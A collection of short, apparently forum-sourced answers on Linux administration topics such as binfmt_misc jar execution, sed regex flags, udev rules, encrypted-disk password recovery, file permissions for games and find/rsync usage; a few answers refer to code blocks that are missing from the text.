you can write a single wrapper script that executes a jar named after the way it is called , and make one symbolic link for each jar . here 's the jar-wrapper script ( warning , typed directly into the browser ) : then create as many symbolic links to the wrapper script as you like , and put them in your $PATH if you want : ln -s wrapper-script myprog1 ln -s wrapper-script myprog2  if you are running linux , and you are the system administrator , then you can select a java interpreter to make jars directly executable , thanks to the binfmt_misc mechanism . for example , on my system : $ cat /proc/sys/fs/binfmt_misc/jar enabled interpreter /usr/lib/jvm/java-6-sun-1.6.0.07/jre/lib/jexec flags: offset 0 magic 504b0304  this system is documented in Documentation/binfmt_misc.txt in the linux kernel documentation . to create an entry like the one above , run the command jexec=/usr/lib/jvm/java-6-sun-1.6.0.07/jre/lib/jexec echo &gt;/proc/sys/fs/binfmt_misc/register ":jar:M:0:504b0304::$jexec:"  your distribution may have a mechanism in place for binfmt registration at boot time . on debian and derivatives , this is update-binfmts , and the jvm packages already register jexec . if you need to pass options , register a wrapper script that adds the options instead of jexec directly .
that means all the jar files in the directory had status changes less than 48 hours ago . detailed explanation according to the find man page , -ctime n File's status was last changed n*24 hours ago.  and . . . and elsewhere . . . +n for greater than n  therefore -ctime +1 means the file status must have changed at least 48 hours ago .
you can use rsyncbackup utility with --exclude option : you can determine $EXCLUDED_DIR_OR_FILE variable by finding last updated file . there are several ways to find last updated file in a given directory , one of them is using ls and awk utilities together : ls -lrt | awk '{ f=$NF }; END{ print f }'  please note that this command prints last modified file name and not he full path to the file .
this can probably be solved in bios configuration . if there is a newer bios for your machine , you should use it . other than that , try booting with pci=noacpi option . if this results in loosing some capabilities you desire , whereas presently everything works fine despite the acpi warning , you might just disable kernel warnings using loglevel=3 boot option . note however , that this disables all kernel warnings , so if you run into problems in the future , you might need to disable this option for diagnosing those .
you can manage these identities with ~/.ssh/config . for example : afterwards just type ssh acc1-server to connect to SERVER as ACCOUNT1 with key ~/.ssh/id_rsa-ACC1-SRV , or ssh acc2-server to connect to SERVER as ACCOUNT2 with key ~/.ssh/id_rsa-ACC2-SRV ; - )
did you try eclipse --launcher.openFile &lt;absolute path of file to open&gt;  eclipse openfile feature .
try this , remembering that i do not tested it and prepending sudo whn needed : dpkg --get-selections &gt; selections dpkg --clear-selections dpkg --set-selections &lt; selections apt-get --reinstall dselect-upgrade  sources : http://www.linuxquestions.org/questions/linux-software-2/force-apt-get-to-redownload-and-reinstall-dependencies-as-well-873038/ https://kura.io/2010/07/02/using-dpkg-selections-to-backup-and-install-packages/?modpagespeed=noscript man apt-get
no , that is not possible . the dhcp server issues ips to clients requesting one . if you had access to the dhcp server , you could fix the ip in the dhcp server config by binding it to the mac address of your card .
in short , you do not need to worry about it as partitioning tools were patched years ago to handle this . also " advanced format " has nothing to do with gpt ; you only need to use that for disks > 2 tib or if you are using uefi . windows does not support gpt without uefi .
full disk encryption is usually done using the dm-crypt device mapper target , with a nested lvm ( logical volume manager ) inside . so to reset your password you will have to unlock/open the crypto container ; this is done using cryptsetup activate the logical volumes ; vgchange is used for this . usually you will not need to care about this . just let the initrd provided by your distribution do the job but tell it not to start /sbin/init but something else — a shell would be good . simply append init=/bin/sh to your kernel 's command line in your boot loader ( with grub you could press e with the appropriate boot entry selected to edit the entry ) . then your kernel should boot up normally , booting into the initrd which should ask for your passphrase and set up your file-systems but instead of booting the system up drop you into a shell . there you will have to remount / read-write : mount -o rw,remount / reset your password using passwd &lt;user&gt; ( since you are root you will not get prompted for the old one ) remount / read-only : mount -o ro,remount / ( skipping this might confuse your init scripts ) start the regular init with exec /sbin/init ( or simply reboot -f ) . if this does not work , you will have to take the approach with greater effort and do it from " outside " , a.k.a. booting a live cd . usually this should be possible by using the debian install cd — the tools should be installed , since the installer somehow has to set up encryption which uses the same schema : boot a live cd open the encrypted partition by issueing # cryptsetup luksOpen /dev/&lt;partition&gt; some_name  where &lt;partition&gt; should be your encrypted partitions name ( sda2 , probably ) . some_name is just… some name . this will prompt you for the disk 's encryption passphrase and create a block device called /dev/mapper/some_name . activate the logical volumes . this should usually work by issueing # vgscan # vgchange -ay  this will create block device files for every logical volume found in the lvm in /dev/mapper/ . mount the volume containing your / file system : # mount /dev/mapper/&lt;vgname&gt;-&lt;lvname&gt; /mnt  where &lt;vgname&gt; and &lt;lvname&gt; are the names of the volume group and the logical volume . this depends on the way distributions set it up , but just have a look into /dev/mapper/ , normally names are self-explanatory . change your password with passwd &lt;user&gt; accordingly .
if you find it takes consistently too long , i guess you are seeing the overhead of fourty-odd thousand executions of echo and osd_cat .
when a program is launched ( by one of the exec(3) family of system calls ) , it inherits the environment ( i.e. . , shell variables exported ) and the open files from the parent . what is done when launching a program is a fork(2) , the child sets up the environment and files , then exec(3)s the new program . when a shell does this , stdin , stdout and stderr are connected to the terminal . what any graphic launcher does is up to it , but is should connect them to /dev/null ( where should keyboard input come from , and where should output go to ? ) . if a program launched like that in turn calls exec(3) , it is as explained above . system(3) is a bit more complex , as it spawns a shell to do command line parsing and so on , and that shell then exec(3)s the command . but the mechanics is the same : files are inherited , as is the environment .
you could create a file with your " new prompt " tweaks and then source it from the command line .  vim new_prompt.bash source ./new_prompt.bash  the new prompt will only be active in that shell . if you open a new shell , your old prompt will be sourced and set . when you are ready to ' commit ' the new prompt , just add it to your bash initialization scripts . edit : i also just found this online bash prompt preview . i do not know what version of bash it is based on .
before deciding what the user and group called games should be used for , you should figure out why you would want to have distinct users . what special permissions are associated to games ? running games . there is usually no need for any privilege to run a game , beyond having a shell account . if you restrict users from running the games you have installed , they can install them on their own anyway . accessing gaming hardware . hardware devices are rarely game-specific : you can plug in a midi keyboard on a game port , use a joystick to control a physical object , … participating in multi-user interactions — primarily storing high scores . this requires the game to run with elevated privileges if you do not want users to be able to edit the high score files with any editor or utility . installing and maintaining game programs . it is rare to have access control related to running games and accessing gaming hardware ( there may be access control to gaming peripherals , but it is not specific to their use for gaming ) . it is common to have access control related to high score files and game program installation . it is a bad idea to make a game program setuid . most games are not designed with security in mind , and there is often a way for the user who runs the game to modify arbitrary files or even run commands with the game 's elevated permissions . if the game executable is setuid , this allows the user running the game to modify the game executable and turn it into a trojan which can then infect any other user who runs the game . thus the user owning the game executables must not be used to control who can run them , use peripherals or write high score files . it can be used to control who can install games . if you have a games user at all , its use would be to allow game administrators to sudo to the game-administrators user ( a more explicit name ) and maintain a /usr/games or /usr/local/games directory owned by game-administrators . such game administrator can gain privileges of any user who plays these games , so game administrator privileges should be given out only to trustworthy people . to control access to high score files , it is ok to make them owned by a group , which can be ( and often is ) called games . the games with shared high score files are then made setgid games . do not use the games group for anything other than ownership of high scores and similar interaction files , and of game executables . note in particular that the game executables must not be writable by the games group : they must have permissions rwxr-sr-x ( 2755 ) . a user who manages to exploit a vulnerability in a setgid game will be able to modify high score files but cause no other mischief . if you wish to restrict access to games to certain users , create a game-players group and make the directory containing the games accessible only to that group , i.e. make /usr/local/games ( or wherever the games are ) owned by game-administrators:game-players and mode rwxr-x--- ( 750 ) .
i am inclined to say there is no easy way to do this . i say this because versioning is not at all a standarized procedure in unix/linux or with any of the vendors at least at a program level . a suggestion might be to examine the installed package information which does contain versioning information . however , if people install products not using the standard package manager for your distribution , then you will have faulty information as well . to be absolutely sure , you will probably have to go with some type of testing checksums between the systems .
assuming your os is microsoft windows , a ssh agent ( like pageant ) may have cached your key if you already connected your server using , for example , putty . see this page on filezilla wiki for details . so your server is probably setup as needed .
from the kernel documentation : the hotplug mechanism asynchronously notifies userspace when hardware is inserted , removed , or undergoes a similar significant state change . there is an event variable for modules , called DRIVER , that suggests a driver for handling the hotplugged device .
curl -l works . it even follows redirects . i found this out in this answer . refer to working script .
just a couple of silly mistakes on my part . below are the reasons for no output a ) udev does not produce output to any sort of terminal/notification . i found it here ! udev does not run these programs on any active terminal , and it does not execute them under the context of a shell . be sure to ensure your program is marked executable , if it is a shell script ensure it starts with an appropriate shebang ( e . g . # ! /bin/sh ) , and do not expect any standard output to appear on your terminal . b ) for redirecting output to the file , i was using ~ instead of the whole path of the user 's home directory . changing it to absolute path did produce the output . for the record , i put my rule under 12-hf-usb.rules . the only problem i am facing is that the script is executed twice , even after using RUN= . i will edit the answer once i find it . it looks like i have to make the rule more specific , to match only one device . it is not important for me at the moment so i will skip it ps : a lot of people are facing trouble while using udev . here is some help to go through the problems . udevinfo and related tools have been replaced by udevadm . below are some useful commands udevadm monitor --udev to view udev activity upon adding/removing hardware in real time lsusb to see attached usb devices udevadm info --attribute-walk --name /dev/sdc? to view heirarchical details of devices this link also proved very helpful
by default sed uses posix basic regular expressions , which do not include the | alternation operator . many versions of sed , including gnu and freebsd , support switching into extended regular expressions , which do include | alternation . how you do that varies : gnu sed uses -r , while freebsd , netbsd , openbsd , and os x sed use -E . other versions mostly do not support it at all . you can use : echo 'cat dog pear banana cat dog' | sed -E -e 's/cat|dog/Bear/g'  and it will work on those bsd systems , and sed -r with gnu . gnu sed appears to have totally undocumented but working support for -E , so if you have a multi-platform script that is confined to the above that is your best option . since it is not documented you probably can not really rely on it , though . a comment notes that the bsd versions support -r as an undocumented alias too . os x still does not today and the older netbsd and openbsd machines i have access to do not either , but the netbsd 6.1 one does . the commercial unices i can reach universally do not . so with all that the portability question is getting pretty complicated at this point , but the simple answer is to switch to awk if you need it , which uses eres everywhere .
the above is a running example of the general idea . . . more here : how to run streamripper and mplayer in a split-screen x terminal , via a single script
i’ve written a function that returns 1 if the argument is the root device , 0 if it is not , and a negative value for error : #include &lt ; stdio . h> #include &lt ; stdlib . h> #include &lt ; sys/stat . h> static int root_check ( const char *disk_dev ) { static const char root_dir [ ] = "/" ; struct stat root_statb ; struct stat dev_statb ; if ( stat ( root_dir , &root_statb ) ! = 0 ) { perror ( root_dir ) ; return -1 ; } if ( ! s_isdir ( root_statb . st_mode ) ) { fprintf ( stderr , " error : %s is not a directory ! \n " , root_dir ) ; return -2 ; } if ( root_statb . st_ino &lt ; = 0 ) { fprintf ( stderr , " warning : %s inode number is %d ; " " unlikely to be valid . \n " , root_dir , root_statb . st_ino ) ; } else if ( root_statb . st_ino > 2 ) { fprintf ( stderr , " warning : %s inode number is %d ; " " probably not a root inode . \n " , root_dir , root_statb . st_ino ) ; } if ( stat ( disk_dev , &dev_statb ) ! = 0 ) { perror ( disk_dev ) ; return -1 ; } if ( s_isblk ( dev_statb . st_mode ) ) /* that is good . */ ; else if ( s_ischr ( dev_statb . st_mode ) ) { fprintf ( stderr , " warning : %s is a character-special device ; " " might not be a disk . \n " , disk_dev ) ; } else { fprintf ( stderr , " warning : %s is not a device . \n " , disk_dev ) ; return ( 0 ) ; } if ( dev_statb . st_rdev == root_statb . st_dev ) { printf ( "it looks like %s is the root file system ( %s ) . \n " , disk_dev , root_dir ) ; return ( 1 ) ; } // else printf ( " ( it looks like %s is not the root file system . ) \n " , disk_dev ) ; return ( 0 ) ; } the first two tests are basically sanity checks : if stat("/", \u2026) fails or “/” is not a directory , your filesystem is broken .   the st_ino tests are something of a shot in the dark . afaik , inode numbers should never be negative or zero .   historically ( by which i mean 30 years ago ) , the root directory always had inode number 1 .   this may still be true for a few flavors of *nix ( anybody heard of “minix” ? ) , and it may be true for the special filesystems , like /proc , and for windows ( fat ) filesystems , but most contemporary unix and unix-like systems seem to use inode number 1 for tracking bad blocks , pushing the root up to inode number 2 . S_ISBLK is true for “block devices” , like /dev/sda1 , where the output from ls\xa0-l begins with “b” .   likewise , S_ISCHR is true for “character devices” , where the output from ls\xa0-l begins with “c” .   ( you may occasionally see disk names like /dev/rsda1 ; the “r” stands for “raw” .   raw disk devices are sometimes used for fsck and backup , but not mounting . )   every inode has a st_dev , which says what filesystem that inode is on .   inodes for devices also have st_rdev fields , which say what device they are .   ( the two comma-separated numbers you see in place of the file size when you ls\xa0-l a device are the two bytes of st_rdev . ) so , the trick is to see whether the st_rdev of the disk device matches the st_dev of the root directory ; i.e. , is the specified device the one that “/” is on ?
go to administration -> software sources and search for nvidia-current . install and restart , run sudo nvidia-settings again .
first , you need to quote the dollar signs that are supposed to be interpreted by the shell . as it is , $x and $(dirname $x) and $(basename $x) are parsed by make . you are also missing a semicolon at the end of the body of the while loop . check the output from running make , you should see the shell complaining about that . another likely problem is that $(dirname $x) already contains the $(W)/$(OVE) part . for example , if $(W) is foo and $(OVE) is bar and $x is subdir/subsubdir/wibble.xml , you will end up trying to write files like foo/bar/foo/bar/subdir/subsubdir_wibble.xml.xml , whereas you probably mean to write foo/bar/foo/bar/subdir/subsubdir_wibble.xml.xml . it is also weird that you are transforming a .xml file into a .xml.xml file . if you meant to strip the original .xml extension , you need to write basename $$x .xml , but it is pointless to remove the extension only to add it again . so you probably meant to write : a further problem is that if any of the runs of process_results.py fails , make will continue running and still report a successful build . tell the shell to stop if an error occurs :
this is probably a problem with gconf . with gconf-editor , reach the /desktop/gnome/peripherals/touchpad " folder " and make sure touchpad_enabled is ticked . i have set this value as mandatory because for some reason this value kept getting disabled . this has not happened since .
have a look at the CONFIG_FIRMWARE_IN_KERNEL , CONFIG_EXTRA_FIRMWARE , and CONFIG_EXTRA_FIRMWARE_DIR configuration options ( found at device drivers -> generic driver options ) . the first option will enable firmware being built into the kernel , the second one should contain the firmware filename ( or a space-separated list of names ) , and the third where to look for the firmware . so in your example , you would set those options to : CONFIG_FIRMWARE_IN_KERNEL=y CONFIG_EXTRA_FIRMWARE='iwlwifi-6000-4.ucode' CONFIG_EXTRA_FIRMWARE_DIR='/lib/firmware'  a word of advise : compiling all modules into the kernel is not a good idea . i think i understand your ambition because at some point i was also desperate to do it . the problem with such approach is that you cannot unload the module once it is built-in - and , unfortunately especially the wireless drivers tend to be buggy which leads to a necessity of re-loading their modules . also , in some cases , a module version of a recent driver will just not work .
you can use bash to do this . to check this for a specific user , you can use sudo . sudo -u joe ./check-permissions.sh /long/path/to/file.txt 
xterm . if you want to copy to the clipboard instead of to the primary selection , set the selectToClipboard resource to true . in your ~/.Xresources: XTerm.vt100.selectToClipboard: true  if you have a mouse without a middle button , pressing both buttons at the same time emulates a middle click in most configurations . you can use xsel or xclip to transfer between the selections : xsel | xsel -b # PRIMARY -&gt; CLIPBOARD xsel -b | xsel # CLIPBOARD -&gt; PRIMARY 
as @anthon said in comments , you most likely have lost your crontab entries . on the off chance you have not , they would be located here in this directory : /var/spool/cron/ in a file named after your username . if they are not there either then they are lost and you will have to recreate them or get them from backups . you might also get lucky and find the remnant of the tmp file used to edit them when you run the command crontab -e . these files would be in /tmp/crontab.* .
linux does not care about the bootable flag on partitions . the diagnostics partition may be necessary to access the bios configuration screen . iirc this is the case on many compaq computers . it is not much space , and it is right at the end of the disk ; i recommend that you leave it alone . the only risk is mistyping the partition numbers and accidentally deleting or overwriting /dev/sda4 . since /dev/sda1 and /dev/sda2 are contiguous , you can join them into a single partition if you like ( delete sda2 then enlarge sda1 ) .
bash faq entry #50: " i am trying to put a command in a variable , but the complex cases always fail ! " tl ; dr : use an array . command=(f --option="One Two Three" --another_option="Four Five Six") "${command[@]}" 
for removing services you must use the -f parameter : sudo update-rc.d -f &lt;service&gt; remove  for configuring startup on boot , try : sudo update-rc.d &lt;service&gt; enable  see if the following symlink is created : /etc/rc.2d/S20&lt;service&gt;  or something similar .
there is a bug on systemd and lvm , i run lvm on a crypted device , which systemd failed to detect . when i finally entered the sulogin interface , i found that vgchange -ay has no effects ( it failed to detect the volume group ) , no idea why . but with legacy init scripts , that works . now i re-formatted the disk , and uses that partition directly , and the boot continues without problem .
your new user new_username will not have root privileges after editing the sudoers file . this change only allows new_username to run sudo in order to run a task with superuser privileges : there are various debates about renaming the root account . it would probably be better to make it secure instead of renaming it .
they are in the $http_proxy , $https_proxy and $ftp_proxy environment variables . also , $no_proxy contains a comma-separated list of host patterns for which no proxy is used . for example : http_proxy=http://proxy.example.com:3128/ no_proxy=localhost,127.0.0.1,*.example.com 
what am i doing wrong ? that is ok . find finds already copied files in new and tries to copy them again , therefore a warning message is displayed . can i use "+" with this command so that files are copied in a single " bundle " ? there are thousands of files ! yes , but you need to modify you command this way : find /var/www/import -iname 'test*' -newer timestamp -exec cp -t new {} +  because {} must be at the end of exec statement in this case .
the user mount option turns off exec by default . change the mount options to include exec explicitly .
that would do nothing , for several reasons . the most simple being that you cannot move a directory in a file . you can try that as non-root with a test directory .
idea #1 - hidden os as an alternative method you could make use of truecrypt 's " hidden operating system " . this allows you to access a fake alternative os when a certain password is used , rather than the primary os . excerpt if your system partition or system drive is encrypted using truecrypt , you need to enter your pre-boot authentication password in the truecrypt boot loader screen after you turn on or restart your computer . it may happen that you are forced by somebody to decrypt the operating system or to reveal the pre-boot authentication password . there are many situations where you cannot refuse to do so ( for example , due to extortion ) . truecrypt allows you to create a hidden operating system whose existence should be impossible to prove ( provided that certain guidelines are followed — see below ) . thus , you will not have to decrypt or reveal the password for the hidden operating system . bruce schneier covers the efficacy of using these ( deniable file systems , so you might want to investigate it further before diving in . the whole idea of deniable encryption is a bit of a can of worms , so caution around using it in certain situations needs to be well thought out ahead of time . idea #2 - add a script to /etc/passwd you can insert alternative scripts to a user 's entry in the /etc/passwd file . example # /etc/passwd tla:TcHypr3FOlhAg:237:20:Ted L. Abel:/u/tla:/usr/local/etc/sdshell  you could setup a user 's account so that it runs a script such as /usr/local/etc/sdshell which will check to see what password was provided . if it is the magical password that triggers the wipe , it could begin this process ( backgrounded even ) and either drop to a shell or do something else . if the password provided is not this magical password , then continue on running a normal shell , /bin/bash , for example . source : 19.6.1 integrating one-time passwords with unix
it is likely to be buffering in awk , not cat . in the first case , awk believes it is interactive because it is input and output are ttys ( even though they are different ttys - i am guessing that awk is not checking that ) . in the second , the input is a pipe so it runs non-interactively . you will need to explicitly flush in your awk program . this is not portable though . for more background and details on how to flush output , read : http://www.gnu.org/software/gawk/manual/html_node/i_002fo-functions.html
here 's a quick and dirty awk version : awk -F- '{print $1"/"$0}' input_file &gt; output_file  what it does is use - as a field separator , and prints the first column ( i.e. . everything before the first - ) , then a / , then the whole original line . a way of doing the same thing with sed would be : sed -e 's;^\([^-]*\)\(.*\);\1/\1\2;' input_file &gt; output_file  ( but that is hardly readable . ) if you want to do it in plain bash , you can use string manipulations : $ foo=AB-10C $ prefix=${foo%%-*} $ echo ${prefix}/${foo} AB/AB-10C  use that in a while read loop or similar if the data is coming from a file .
for your purpose , just call wget . it will retrieve the certificate and refuse to connect if the certificate is invalid . obviously , if you pass an https:// url , wget will connect using https .
what about the ubuntu manual ?
i eventually found these hiding inside : /etc/rc.local where 's there is a bunch of ifconfig commands configuring these extra addresses .
no question , rsync will be faster . dd will have to read and write the whole 1.5tb and it will hit every bad block , triggering multiple read retries which will further slow an already long process . rsync will only have to read blocks that matter , and since it is unlikely that every bad block occurs in existing files or directories , rsync will encounter fewer of them . the bad thing about using rsync for disk rescue is that if it does encounter a bad block , it gives up on the file or directory that contains it . if a directory contains a lot of subdirectories and rsync gives up on reading it , then your copy could be missing a lot of what you want to save . the problem is that rsync relies on the filesystem structures to tell it what to copy and the filesystem itself is no longer trustworthy . for this reason i would first use rsync to copy files off the drive , but i would look very carefully at the output to see what was missed . if you can not live without what rsync failed to copy , then use dd or one of the other low level block copying methods . you can then fsck the copy , mount it and see if you can recover more of your files .
as i can see you do not need to remove your dir , only files inside . so you can recreate it rm -r /path/to/dir &amp;&amp; mkdir /path/to/dir  or even delete only files inside find /path/to/dir -type f -delete  afair first one works faster .
first , did you try to make your modem work in linux ? there is a way to use some windows drivers in linux : ndiswrapper . on ubuntu , start with the ndiswrapper page in the community documentation . if that fails , you might try to run your ubuntu installation in a virtual machine under windows . the main hurdle would be to get the vm to allow the guest to access the raw disk . this site has plausible-looking instructions for virtualbox ( where you can not set this up with the gui but you can with the command-line tools ) ; i can not vouch for their correctness . you can always install a package manually : download the .deb file ( make sure it is for the right version and architecture ) , and install it with the command sudo dpkg -iGE /path/to/package.deb . i do not think you can get a complete ubuntu release on dvd , but the official dvds have more packages than the cds . to manage updates , try apt-offline . you run it on your ubuntu machine to generate a “signature file” , then run it under either linux or windows to download packages as directed by the “signature file” , and finally run it on ubuntu again to install the downloaded packages . see the apt-offline howto for more complete instructions . two other packages that might help are apt-zip ( somewhat similar to apt-offline ) and aptoncd ( designed to make custom debian/ubuntu package cds ) .
this answer assumes you have a working video driver and have installed the required software . the goal is to first run codeswarm in software render mode . under optimal conditions , using opengl should be as easy as changing a value in a configuration file later on . relevant directory structure once you have extracted rictic 's fork archive with unzip , take a quick look at the directory structure : clone a repository select a a project repository and then clone it locally : git clone https://github.com/someproject.git  generate a log file proceed to the newly created repository directory and generate a properly formatted git log like so : for long projects , there might be value in specifying a date range so as to focus on a specific time frame ( for ex . --since=yyyy/mm/dd ) . or we can edit the xml data later on . convert our . log file to a . xml file we then bring this file to the /bin directory and convert this with the provided python script : python2.7 convert_logs.py -g activity.log -o activity.xml  if there are syntax errors this is often about the version of frameworks - python in this case - and we have two versions of that in the path with our setup . this python script does not work with python 3.3 i.e. the default when you invoke " python " ( on archbang ) so we need to specify 2.7 in our case . this is where you would actually open the . xml file in a text editor for example and trim out the lines for the time period you do not want if you did not specify any time frame when extracting the log initially and you want less data . now you can copy that . xml file to your /data dir or specify it is location in your . config file . sample . config configuration file move the default sample.config file to another name , create an empty file , put the following in it , then save it as sample.config . the software reads this filename by default so it is just convenient to use that , and so you will be able to simply press enter when the software asks for a . config file interactively as it does in all cases : you can eventually compare those settings with the original sample.config file and adjust the parameters . note that one single char off in this file will trigger general exceptions in the java runtime . java it is very important to set this up properly otherwise you will end up with more generic error messages about general exceptions . when run.sh script is run , it validates if code_swarm . jar is present in /dist and if not , it compiles it . once it is compiled , it gets executed . unfortunately , the script is geared at macosx by default as we see in the run.sh script : the last line is what gets executed here . comment it and use instead in this case : when we look at the contents of the /lib directory , we see a linux-x86_64 directory ( and that is what we have here i.e. 64bit version of linux ) otherwise simply lib/ might be enough . do not mix paths i.e. do not include both /lib and /lib/linux-x86_64 ) : if this is not properly set , you will get such errors as this : exception in thread " animation thread " java . lang . unsatisfiedlinkerror : no gluegen-rt in java . library . path at java . lang . classloader . loadlibrary ( classloader . java:1886 ) . . . this happens when an incorrect java library path is specified . it might be tempting to remedy this by changing the /src/code_swarm . java code but it should not be required and the issue is often related to the -Djava.library.path . making sure this is set up right helps to avoid needlessly complicated issues . ( optional ) features . a few changes to the code_swarm . java file in /src can improve some features . for instance there is a feature in the rendering called popular nodes . when the codeswarm renders , you can press " p " to show the popular nodes i.e. the files that get edited the most . by default this appears at the top right of the render , but the legend for the color coding appears to the top left . altering the default behavior can make this appear automatically ( so you press " p " to turn it off ) while putting this underneath the color legend to the left helps to regroup the information in one spot . to implement this find the following block of code and update the values accordingly - this is an updated version of that segment ( result shown in q ) : at the top of the source , you will find : boolean showPopular = true;  adding = true makes the popular nodes appear by default . this gets compiled only on the first run with ant during run . sh execution ( unless you have java issues and does not get compiled at all ) . so if you modify the code you must do so before compiling , otherwise you are just changing the source . if you want to restart the process which takes a few seconds , just delete the already compiled version in /dist , modify the source , then run run.sh again to compile anew . running codeswarm finally , now that we have the activity.xml file , the sample.config set up , and the modified run.sh script is java sane , ( and that we implemented as an option the small changes to the . java source code ) we can run our codeswarm with : ./run.sh  for some reason the software may at first not render . if after 30 secs there is no render , interrupt the process with ctrl-z and launch again . should work on retries . use " space " to pause the rendering and " q " to quit . enabling opengl rendering set UseOpenGL=true in your sample.config file .
nemo does ( in so far as i just tried this and it worked ) , but it is really part of cinnamon which is a replacement for the gnome 3 shell . it does not appear to have any dependencies on cinnamon , however . it is in the repos for fedora 17+ and mint , of course . probably others as well . github if you need the source . on a further note , i had no idea about the . hidden file support in nautilus ( or nemo ) and i definitely like this .
wireshark might be what you are looking for . to analyse packet loss you should isolate the session/stream and append " and tcp . analysis . lost_segment " to the automatically generated filter . if you see packets there then it is likely there is packet loss .
the debian package dwww give access to all the documentation installed by the packages , included the manual pages . after installing the package with your favorite package manager , you will be able to browse the local documentation with your navigator on http://localhost/dwww/ . by default , access to this url is restricted to local connections but you can change this restriction in the configuration file /etc/dwww/apache.conf ( do not forget to reload apache after changing something in this file ) .
two ideas : first , try to import the key into the ssh-agent with ssh-add $keyfile to be sure it is really a problem with the keyfile and not something about the server . second , fetch a copy of your private key from your backup and use something like cmp to check , whether the file really changed .
when you did crontab -e , nothing happens and it returned you normal prompt ? if it gives you an empty space you should enter your variables like : 0 0 * * * /opt//newauditlog.ksh &gt; /dev/null 2&gt;&amp;1  after you did that you can exit with :wq !
you could use file to determine the type of the plist and if it is binary :  plutil -convert xml1 $file &amp;&amp; sed /*whatever*/ $file &amp;&amp; plutil -convert binary1 $file  otherwise of course you can just use sed ( or perl ) directly on the xml file .
/etc/cron.d is not a symlink on my centos 5 . x box :  drwx------ 2 root root 4096 Feb 5 2013 /etc/cron.d  so , if it is missing entirely , you can restore it with : # install -d -m 700 -o root -g root /etc/cron.d  if something else is in its place , you could move it out of the way , recreate the directory , and then selectively move things back in place . to get a list of all files that are supposed to be installed there , say : # rpm -qla | grep /etc/cron.d  saying rpm -qf filename will tell you which package owns that file , hence which package you can reinstall to restore that file .
it could be a file system or disk failure . check dmesg and system logs for any clues . look there before you reboot if you have not already . if you have rebooted does the system come up clean or warn you about file system problems ? you can remount the file system read-write using mount -o remount,rw / but i do not recommend doing that until you know why it mounted itself ro . it possible to hit a keyboard shortcut that would remount the root file system read-only . usually this is alt sysreq u . did you or your cat perchance do that ? did you initiate a shutdown request and then abort it ? the shutdown scripts usually remount the system ro towards the end of the process , but i have seen them get borked and skip to the end : )
perl comes with a rename(1) command that is installed on most linux systems . on debian-based systems it is in /usr/bin and for this case , you would use it like this : $ rename 's/tmp$/temp/' /home/*/tmp  the first argument is a perl expression that acts on the subsequent arguments generating a new name . each is then renamed according to the result of that expression . if a home directory already has a file/directory called temp , you will just get an error for that directory and rename will continue : /home/c/tmp not renamed: /home/c/temp already exists  you can run it first with the -n flag to see what rename would do without actually doing it and make sure it all looks right . then drop the -n and let it do its job .
scai seems to have it answered in the comments . a lot of these are just plain text , so there is no proprietary license on them ; use whichever you had like . m3u seems to be a popular choice . edit : polemon pointed out that some plain text formats such as asx ( xml-based ) require a license for use . watch out for things like this .

the part of your interface config , namely inet6 2001:5c0:1103:5800::/56 in ip addr listing , means two things : 2001:5c0:1103:5800:: is assigned to your interface - you can ping6 it to find out it is valid , whereas 2001:5c0:1103:5800::1 will not respond /56 serves for routing purposes , and means only that if you want to send something to the network with that prefix ( inet6 2001:5c0:1103:5800::/56 ) , it should go out using the tun interface . you can find that out using ip -6 route . for how to do what you want , you can check out this answer . now , why did the binds work ? it is because you can use a network address in bind call , and it will bind your socket to interface ( s ) which have access to the given network ( specifically binding to 0.0.0.0 binds to all interfaces , rather than to all of the ips in the internet ) .
from man page : so you can use awk to extract only those levels ( 2,3,4,5 ) : chkconfig --list | grep httpd | awk '{ print $4 }' | cut -d ':' -f 2  and do the same for other levels ( 3,4,5 ) by replacing $4 by ( $5 , $6 , $7 )
if i have planned ahead , i use brace expansion . here is another approach using the default readline keyboard shortcuts : mv foo/bar/poit/soid/narf.txt: start ctrl-w : unix-word-rubout to delete foo/bar/poit/soid/narf.txt ctrl-y space ctrl-y : yank , space , yank again to get mv foo/bar/poit/soid/narf.txt foo/bar/poit/soid/narf.txt meta-backspace meta-backspace : backward-kill-word twice to delete the last narf.txt troz.txt: type the tail part that is different if you spend any non-trivial amount of time using the bash shell , i would recommend periodically reading through a list of the default shortcuts and picking out a few that seem useful to learn and incorporate into your routine . chapter 8 of the bash manual is a good place to start . knowing the shortcuts can really raise your efficiency .
you should be able to change that in gnome 's control center . run gnome-control-center or choose settings from the menu . then , go into the ' mouse and touchpad ' section and switch to edge scrolling in the ' touchpad ' tab : if that does not work , you can try and set it manually . edit or create the file /usr/lib/X11/xorg.conf.d/10-synaptics.conf and make it look like this :
use ls -B to hide the ~ files when displaying file names . the command line switches , -B or --ignore-backups , do not list implied entries ending with ~ .
how about just this ? $ gunzip *.txt.gz  gunzip will create a gunzipped file without the .gz suffix and remove the original file by default ( see below for details ) . *.txt.gz will be expanded by your shell to all the files matching . this last bit can get you into trouble if it expands to a very long list of files . in that case , try using find and -exec to do the job for you . from the man page gzip(1):
you can use the find command to find all files that have been modified after a certain number of days . for example , to find all files in the current directory that have been modified since yesterday ( 24 hours ago ) use : find . -maxdepth 1 -mtime -1  note that to find files modified before 24 hours ago , you have to use -mtime +1 instead of -mtime -1 .
i have used debian , gentoo and arch for a couple of years each . the more customizable by far is gentoo . but it takes thought each time you want a given package . debian is , well debian : a mainstream distro , that can feel bloated to some . given your requirements , i think you might like arch . it is pretty lightweight and there are tons of bleeding-edge packages .
gpg --list-packets keyfile.gpg  even possible as gpg --export 0x12345678 | gpg --list-packets gpg --export-secret-keys 0x12345678 | gpg --list-packets 
no . however ambitious and great your idea about halting runlevels , you need not do that . once you are logged into your gnome system , switch to tty1 using ' ctrl + alt + f1' . there enter the following command : $ xinit metacity -- :1  this will launch metacity on screen 1 . if you want you can also end your gnome session before doing this .
yes , the ;: do_some_task ; say 'done' 
this is actually very easy . use the easybcd software and follow the steps from type 1 recovery on this wiki page . in the next reboot , i did not get the grub boot menu . i removed the linux mint and swap partitions and its working just fine .
my first guess was btrfs since the i/o processes of this file system sometimes take over . but it would not explain why x locks up . looking at the interrupts , i see this : well , duh . the usb driver uses the same irq as the graphics card and it is first in the chain . if it locks up ( because the file system does something expensive ) , the graphics card starves ( and the network , too ) .
as long as you stick to left-aligned columns or a non-proportional font , ${goto N} works . NAME${goto 100}PID${goto 200} CPU%${goto 300}MEM% ${top name 1}${goto 100}${top pid 1}${goto 200}${top cpu 1}${goto 300}${top mem 1}  for right alignment , you can try playing with alignr and offset .
i do not know how this remote 3d works but if the client is indeed trying to run the amd64 executable , this is definitely the reason this message appears .
